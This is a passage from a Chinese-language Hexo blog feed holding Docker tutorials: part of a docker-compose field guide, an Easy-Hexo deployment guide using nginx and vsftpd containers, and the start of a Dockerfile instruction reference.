aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">build:</span></span><br><span class="line">      <span class="attr">context:</span> <span class="string">./dir</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">Dockerfile-alternate</span></span><br><span class="line">      <span class="attr">args:</span></span><br><span class="line">        <span class="attr">buildno:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></div><p>其中args是在Dockerfile中定义的变量，比如：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ARG</span> buildno</span><br><span class="line"><span class="keyword">ARG</span> gitcommithash</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"Build number: <span class="variable">$buildno</span>"</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"Based on commit: <span class="variable">$gitcommithash</span>"</span></span></span><br></pre></td></tr></table></figure></div><p>另一种定义格式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">build:</span><br><span class="line">  context: .</span><br><span class="line">  args:</span><br><span class="line">    - buildno=<span class="number">1</span></span><br></pre></td></tr></table></figure></div><p>此外，<code>build</code>和<code>image</code>可以一起使用，<code>image</code>用于定义生成的镜像名</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">taqini/myapp</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./dir</span></span><br></pre></td></tr></table></figure></div><h4 id="user"><a href="#user" class="headerlink" title="user"></a>user</h4><p>定义默认用户</p><h4 id="restart"><a href="#restart" class="headerlink" title="restart"></a>restart</h4><p>定义容器挂掉后是否自动重启</p><h4 id="environment"><a href="#environment" class="headerlink" title="environment"></a>environment</h4><p>定义环境变量</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">environment:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">UPLOAD_FOLDER=/var/uploads</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">WORKERS=1</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">LOG_FOLDER=/var/log/xxx</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">ACCESS_LOG=-</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">ERROR_LOG=-</span></span><br></pre></td></tr></table></figure></div><h4 id="volumes"><a href="#volumes" class="headerlink" title="volumes"></a>volumes</h4><p>定义挂载的数据卷</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">volumes:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">./file/bin:/home/ctf:ro</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">./file/config/motd:/etc/motd:ro</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">./file/config/issue:/etc/issue:ro</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">./file/config/legal:/etc/legal:ro</span></span><br></pre></td></tr></table></figure></div><blockquote><p>末尾加:ro可控制容器中数据卷权限为只读</p><p>若容器中存在同名文件(夹)，本地文件将覆盖容器中文件(夹)</p><p>注意：若覆盖文件，文件权限也会覆盖</p></blockquote><blockquote><p>挂载数据卷，可以使得容器与数据(应用程序数据、配置信息等等)分离，这样在更新容器的时候不会丢失数据</p></blockquote><h4 id="ports"><a href="#ports" class="headerlink" title="ports"></a>ports</h4><p>定义端口映射 本地：容器</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"10080:80"</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"10022:22"</span></span><br></pre></td></tr></table></figure></div><h4 id="networks"><a href="#networks" class="headerlink" title="networks"></a>networks</h4><p>定义网络</p><h4 id="command"><a href="#command" class="headerlink" title="command"></a>command</h4><p>定义容器默认执行的命令</p><p>格式和dockerfile差不多：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">webapp:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">./</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">bundle</span> <span class="string">exec</span> <span class="string">thin</span> <span class="string">-p</span> <span class="number">3000</span></span><br><span class="line">    <span class="comment">#command: ["bundle", "exec", "thin", "-p", "3000"]</span></span><br></pre></td></tr></table></figure></div><blockquote><p>compose中定义的<code>command</code>会覆盖dockerfile中的<code>CMD</code></p></blockquote><h4 id="entrypoint"><a href="#entrypoint" class="headerlink" title="entrypoint"></a>entrypoint</h4><p>和command类似，不多说了</p><h1 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h1><p><a href="http://taqini.space/2020/03/17/note-for-docker-3">下一篇</a>介绍docker命令和docker-compose命令</p><p>docker命令比较基础，但是命令繁杂</p><p>docker-compose像是一个容器管理工具，用起来比较简便</p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> docker-compose </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy-Hexo安装指南</title>
      <link href="/2020/03/02/easy-hexo/"/>
      <url>/2020/03/02/easy-hexo/</url>
      
        <content type="html"><![CDATA[<h1 id="Easy-Hexo"><a href="#Easy-Hexo" class="headerlink" title="Easy-Hexo"></a>Easy-Hexo</h1><p>通过docker快速搭建Hexo博客平台</p><h2 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h2><table><thead><tr><th>docker服务器</th><th>功能</th></tr></thead><tbody><tr><td><code>hexo</code></td><td>负责实时检测文章、生成静态页面</td></tr><tr><td><code>nginx</code></td><td>用于展示<code>hexo</code>生成的静态页面</td></tr><tr><td><code>vsftpd</code></td><td>用于上传、编辑、删除文章</td></tr></tbody></table><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>通过docker部署，方便快捷</li><li>数据与服务隔离，易于升级</li><li>通过ftp服务器编辑、发布文章，对不熟悉控制台的用户比较友好</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/TaQini/easy_hexo.git</span><br></pre></td></tr></table></figure></div><p>进入目录，修改ftp服务默认密码：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd easy_hexo</span><br><span class="line">vim docker-compose.yml</span><br></pre></td></tr></table></figure></div><p>将<code>your_passwd</code>改成你的密码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">environment:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">FTP_USER=blog</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">FTP_PASS=your_passwd</span></span><br></pre></td></tr></table></figure></div><p>一键安装</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure></div><p>安装成功后，访问<a href="http://your.site:8080" target="_blank" rel="noopener">http://your.site:8080</a>即可浏览网页</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200302203400.png" data-fancybox="group" data-caption="hexo_default" class="fancybox"><img alt="hexo_default" title="hexo_default" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200302203400.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="WEB服务端口配置"><a href="#WEB服务端口配置" class="headerlink" title="WEB服务端口配置"></a>WEB服务端口配置</h3><blockquote><p>web服务默认运行在<code>8080</code>端口</p></blockquote><p>打开<code>docker-compose.yml</code>文件，找到如下部分：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">"nginx"</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./public:/usr/share/nginx/html</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">"8080:80"</span></span><br></pre></td></tr></table></figure></div><p>将默认的<code>8080</code>修改即可</p><h3 id="FTP服务器配置"><a href="#FTP服务器配置" class="headerlink" title="FTP服务器配置"></a>FTP服务器配置</h3><blockquote><p>ftp默认绑定的20/21端口，如无特殊需要，不建议进行修改</p></blockquote><p>ftp服务在<code>docker-compose.yml</code>文件中对应的配置如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yaml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">vsftpd:</span></span><br><span class="line">  <span class="attr">image:</span> <span class="string">"fauria/vsftpd"</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./source/_posts:/home/vsftpd/blog/blog</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"20:20"</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"21:21"</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">"21100-21110:21100-21110"</span></span><br><span class="line">  <span class="attr">environment:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">FTP_USER=blog</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">FTP_PASS=your_passwd</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PASV_ADDRESS=127.0.0.1</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PASV_MIN_PORT=21100</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">PASV_MAX_PORT=21110</span></span><br></pre></td></tr></table></figure></div><h3 id="Hexo配置"><a href="#Hexo配置" class="headerlink" title="Hexo配置"></a>Hexo配置</h3><p>安装成功后，查看服务是否正常运行：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose ps</span><br></pre></td></tr></table></figure></div><blockquote><p>若三个<code>State</code>都是<code>Up</code>则说明服务正常运行</p></blockquote><p>输入如下命令，进入控制台：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose exec hexo /bin/bash</span><br></pre></td></tr></table></figure></div><p>随后可对hexo进行配置，具体配置请参考<a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">官方文档</a></p><h2 id="编辑文章"><a href="#编辑文章" class="headerlink" title="编辑文章"></a>编辑文章</h2><p>在本地使用<code>markdown</code>语言编写文章，推荐使用Typora <a href="https://typora.io/" target="_blank" rel="noopener">下载地址</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">markdown</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello Hexo</span><br><span class="line">date: 2020-03-02 12:34:00</span><br><span class="line">updated: 2020-03-02 13:24:00</span><br><span class="line">tags: atag</span><br><span class="line">categories: acat</span><br><span class="line">keywords: hexo</span><br><span class="line">description: hello</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="section"># Hello Hexo</span></span><br><span class="line"></span><br><span class="line">Hello world</span><br></pre></td></tr></table></figure></div><p>文章开头的参数可配置，Hexo预先定义的参数如下：</p><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>layout</code></td><td>布局</td><td></td></tr><tr><td><code>title</code></td><td>标题</td><td>文章的文件名</td></tr><tr><td><code>date</code></td><td>建立日期</td><td>文件建立日期</td></tr><tr><td><code>updated</code></td><td>更新日期</td><td>文件更新日期</td></tr><tr><td><code>comments</code></td><td>开启文章的评论功能</td><td>true</td></tr><tr><td><code>tags</code></td><td>标签（不适用于分页）</td><td></td></tr><tr><td><code>categories</code></td><td>分类（不适用于分页）</td><td></td></tr><tr><td><code>permalink</code></td><td>覆盖文章网址</td><td></td></tr><tr><td><code>keywords</code></td><td>仅用于 meta 标签和 Open Graph 的关键词（不推荐使用）</td><td></td></tr></tbody></table><blockquote><p>可以保存成一个模板，方便以后使用 :D</p></blockquote><p>编写的文章最好保存在本地的一个文件夹中，这样便于后续的<a href="#发布文章">文章发布</a></p><p>使用typora在本地写文章时，可以直接预览，十分方便</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200302204055.png" data-fancybox="group" data-caption="md" class="fancybox"><img alt="md" title="md" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200302204055.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="发布文章"><a href="#发布文章" class="headerlink" title="发布文章"></a>发布文章</h2><p>使用先前设置的用户名和密码连接FTP服务器</p><blockquote><p>建议使用FTP客户端，比如FileZilla <a href="https://filezilla-project.org/download.php?type=client" target="_blank" rel="noopener">下载地址</a></p></blockquote><p>把本地的文章上传到ftp服务器的<code>/blog</code>文件中</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200302203614.png" data-fancybox="group" data-caption="ftp" class="fancybox"><img alt="ftp" title="ftp" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200302203614.png" src="/img/loading.gif" class="lazyload"></a></p><p>上传成功后，再次访问<a href="http://your.site:8080" target="_blank" rel="noopener">http://your.site:8080</a>即可看到刚刚发布的文章</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200302203917.png" data-fancybox="group" data-caption="new_post" class="fancybox"><img alt="new_post" title="new_post" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200302203917.png" src="/img/loading.gif" class="lazyload"></a></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose restart</span><br></pre></td></tr></table></figure></div><h3 id="关闭服务"><a href="#关闭服务" class="headerlink" title="关闭服务"></a>关闭服务</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose kill</span><br></pre></td></tr></table></figure></div><h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose start</span><br></pre></td></tr></table></figure></div><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>关闭服务</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose kill</span><br><span class="line">sudo docker-compose rm -f</span><br></pre></td></tr></table></figure></div><p>更新基础镜像</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull nginx                   </span><br><span class="line">sudo docker pull node </span><br><span class="line">sudo docker pull fauria/vsftpd</span><br></pre></td></tr></table></figure></div><p>重新安装</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> docker-compose </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker用法总结之Dockerfile</title>
      <link href="/2020/03/01/note-for-docker/"/>
      <url>/2020/03/01/note-for-docker/</url>
      
        <content type="html"><![CDATA[<p>最近在把服务器上的应用尽量docker化，踩了不少坑……不过也正好学习<code>docker</code>和<code>docker-compose</code>的用法。此篇文章记录docker常用命令、使用方法，用于备忘。</p><h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><p>主要是<code>dockerfile</code>和<code>docker-compose.yml</code>两个文件，这俩的关系，简单的讲：</p><ul><li><p><code>dockerfile</code>包含<strong>生成镜像</strong>的配置信息，其中的指令作用的对象是<strong>镜像</strong>。</p></li><li><p><code>docker-compose.yml</code>包含<strong>启动容器</strong>的配置信息，其中指令作用的对象是<strong>容器</strong>。</p></li></ul><p>镜像一般只生成一次，而容器则可以启动多个。</p><h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1><p>用于<strong>生成docker镜像</strong>的配置文件，简单讲就是初始化镜像用的，比如拷贝文件到镜像、执行命令、暴露端口、设置用户等等。</p><p>生成镜像的常用命令如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker build -t name:tag PATH</span></span><br></pre></td></tr></table></figure></div><blockquote><p>docker build [OPTIONS] PATH | URL | - </p><p>通过<code>-t</code> 指定镜像名/版本 </p><p><code>PATH</code>为Dockerfile所在的目录</p></blockquote><h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><p>一个<code>Dockerfile</code>大致长这个亚子：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> useradd -m ctf</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /home/ctf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./start.sh /start.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /start.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"/start.sh"</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctf</span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure></div><p>基本的书写格式就是：<strong>指令</strong>+<strong>操作</strong></p><blockquote><p>使用<code>Dockerfile</code>生成镜像，就是对原始镜像逐步执行<code>Dockerfile</code>中指令</p></blockquote><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>指令不多，列张表格好了：</p><table><thead><tr><th>指令</th><th>操作(例子)</th><th>功能</th></tr></thead><tbody><tr><td><a href="#FROM">FROM</a></td><td><code>FROM ubuntu:16.04</code></td><td>指定初始镜像</td></tr><tr><td><a href="#WORKDIR">WORKDIR</a></td><td><code>WORKDIR /home/taqini</code></td><td>切换工作目录</td></tr><tr><td><a href="#USER">USER</a></td><td><code>USER taqini</code></td><td>切换默认用户</td></tr><tr><td><a href="#ARG">ARG</a></td><td><code>ARG CODE_VERSION=latest</code></td><td>定义变量</td></tr><tr><td><a href="#ENV">ENV</a></td><td><code>ENV DALAO=Imagin</code></td><td>定义环境变量</td></tr><tr><td><a href="#COPY">COPY</a></td><td><code>COPY test /opt/test/</code></td><td>拷贝文件至镜像</td></tr><tr><td><a href="#RUN">RUN</a></td><td><code>adduser taqini</code></td><td>执行系统命令</td></tr><tr><td><a href="#EXPOSE">EXPOSE</a></td><td><code>EXPOSE 80/tcp</code></td><td>曝露端口</td></tr><tr><td><a href="#CMD">CMD</a></td><td><code>CMD [&quot;start.sh&quot;]</code></td><td>启动时执行命令</td></tr><tr><td><a href="#ENTERPOINT">ENTERPOINT</a></td><td><code>ENTRYPOINT [&quot;entrypoint.sh&quot;]</code></td><td>指定启动时的入口点</td></tr></tbody></table><h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3><p>指定初始镜像( <a href="https://docs.docker.com/engine/reference/glossary/#base-image" target="_blank" rel="noopener"><em>Base Image</em></a> )，写法有三种</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> &lt;image&gt; [AS &lt;name&gt;]</span><br><span class="line"><span class="keyword">FROM</span> &lt;image&gt;[:&lt;tag&gt;] [AS &lt;name&gt;]</span><br><span class="line"><span class="keyword">FROM</span> &lt;image&gt;[@&lt;digest&gt;] [AS &lt;name&gt;]</span><br></pre></td></tr></table></figure></div><p>一般直接<code>FROM image:tag</code>就行</p><h3 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h3><p>相当于<code>cd</code>，用于切换工作目录，例如：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /dir</span></span><br></pre></td></tr></table></figure></div><blockquote><p>最后一个<code>WORKDIR</code>指定的路径将作为docker启动的默认路径</p></blockquote><h3 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h3><p>切换到指定用户，一般指定用户名或是<code>uid</code>：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">USER</span> taqini</span><br><span 